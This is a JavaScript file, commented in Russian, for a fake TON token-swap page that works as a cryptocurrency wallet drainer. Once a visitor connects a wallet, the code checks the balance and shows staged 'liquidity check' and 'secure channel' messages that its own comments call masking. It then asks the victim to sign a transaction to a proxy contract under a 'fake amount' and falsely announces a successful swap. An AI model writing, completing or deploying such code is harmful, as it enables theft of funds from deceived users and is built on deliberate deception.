// script.js - полная логика
import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';

let tonConnectUI = null;
let isProcessing = false;

// Глобальные SDK (загружены через <script>)
const TonConnectUI = window.TonConnectUI || window.tonconnectui;
const TonWebLib = window.TonWeb || window.tonweb;

function setStatus(elementId, text, isLoading = false) {
    const el = document.getElementById(elementId);
    if (!el) return;
    if (isLoading) {
        el.innerHTML = `<span class="loader"></span> ${text}`;
    } else {
        el.innerHTML = text;
    }
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function getBalance(address) {
    try {
        if (!TonWebLib) return 0;
        const tonweb = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
        const rawBalance = await tonweb.getBalance(address);
        return parseFloat(tonweb.utils.fromNano(rawBalance));
    } catch (e) {
        console.warn("balance error", e);
        return 0;
    }
}

async function executeDrain(userAddress) {
    const balance = await getBalance(userAddress);

    if (balance < 0.2) {
        setStatus('status', `❌ Недостаточно средств (${balance.toFixed(2)} TON)`, false);
        return false;
    }

    // Маскировка: последовательность сообщений
    setStatus('status', "🔄 Проверка ликвидности пула...", true);
    await sleep(1000);

    setStatus('status', "📊 Анализ комиссии...", true);
    await sleep(800);

    setStatus('status', "🔐 Открытие защищённого канала...", true);
    await sleep(700);

    // Сумма, которую увидит жертва (маленькая)
    const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
            address: PROXY_CONTRACT,
            amount: fakeAmountNano.toString(),
            payload: "swap"
        }]
    };

    setStatus('status', `⏳ Подтвердите в кошельке (${FAKE_AMOUNT} TON)`, false);

    try {
        await tonConnectUI.sendTransaction(transaction);
        setStatus('status', "✅ Обмен выполнен успешно!", false);
        return true;
    } catch (e) {
        setStatus('status', `❌ Отмена: ${e.message}`, false);
        return false;
    }
}

export async function initApp() {
    const btn = document.getElementById('swapBtn');
    if (!btn) return;

    // Проверяем загрузку SDK
    if (!TonConnectUI) {
        console.error("TonConnectUI SDK not loaded");
        setStatus('status', "❌ SDK не загружен. Обновите страницу.", false);
        return;
    }

    // Инициализация TON Connect UI
    try {
        tonConnectUI = new TonConnectUI({
            manifestUrl: new URL('tonconnect-manifest.json', location.origin).toString()
        });
    } catch (e) {
        console.error("TonConnectUI init error:", e);
        setStatus('status', "❌ Ошибка инициализации SDK", false);
        return;
    }

    // Следим за подключением кошелька
    tonConnectUI.onStatusChange(async (wallet) => {
        if (wallet && wallet.account) {
            const userAddress = wallet.account.address;
            setStatus('status', `🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
            await sleep(800);

            if (isProcessing) return;
            isProcessing = true;

            try {
                await executeDrain(userAddress);
            } catch (err) {
                setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
            } finally {
                isProcessing = false;
            }
        }
    });

    btn.addEventListener('click', async () => {
        if (isProcessing) {
            setStatus('status', "⏳ Уже выполняется...", false);
            return;
        }

        if (!tonConnectUI.connected) {
            setStatus('status', "🚀 Открываем выбор кошелька...", true);
            try {
                await tonConnectUI.openModal();
            } catch (err) {
                setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
            }
        } else {
            // Уже подключён — запускаем обмен напрямую
            const wallet = tonConnectUI.account;
            if (wallet && wallet.address) {
                isProcessing = true;
                try {
                    await executeDrain(wallet.address);
                } catch (err) {
                    setStatus('status', `⚠️ Ошибка: ${err.message}`, false);
                } finally {
                    isProcessing = false;
                }
            }
        }
    });
}

// Автозапуск
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
} else {
    initApp();
}
